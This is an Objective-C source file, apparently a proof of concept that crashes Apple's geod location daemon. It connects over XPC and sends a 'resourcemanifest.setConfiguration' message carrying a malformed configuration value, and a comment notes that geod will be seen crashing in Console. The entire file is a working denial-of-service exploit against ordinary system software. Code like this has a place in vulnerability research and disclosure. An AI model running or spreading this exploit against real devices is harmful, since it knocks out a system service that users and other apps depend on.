#import <xpc/xpc.h>
#import <Foundation/Foundation.h>

void geod_dos() {
	xpc_connection_t conn = xpc_connection_create_mach_service("com.apple.geod", NULL, 0); // Create the client to communicate with geod
	
 	xpc_connection_set_event_handler(conn, ^(xpc_object_t object) {
		NSLog(@"Event: %@", object);
	}); // Set a dummy event handler
	xpc_connection_resume(conn); // Start the client
	
	xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0); // Create our message
	
	xpc_dictionary_set_string(msg, "message", "resourcemanifest.setConfiguration"); // Set the message key so that the ResourceManifestServer handles the message
	
	xpc_object_t userInfo = xpc_dictionary_create(NULL, NULL, 0); // Create our user info dictionary
	xpc_object_t cfg = xpc_dictionary_create(NULL, NULL, 0); // Create our cfg dictionary
	xpc_dictionary_set_string(cfg, "tgi", "lol"); // Set our bad value for the key
	xpc_dictionary_set_value(userInfo, "cfg", cfg); // Set the dictionary in user info
	xpc_dictionary_set_value(msg, "userInfo", userInfo); // Set the user info in our message
	
	xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg); // Send the message. If you look in Console, you will see geod crashing :)

	NSLog(@"Reply: %@", reply);
}
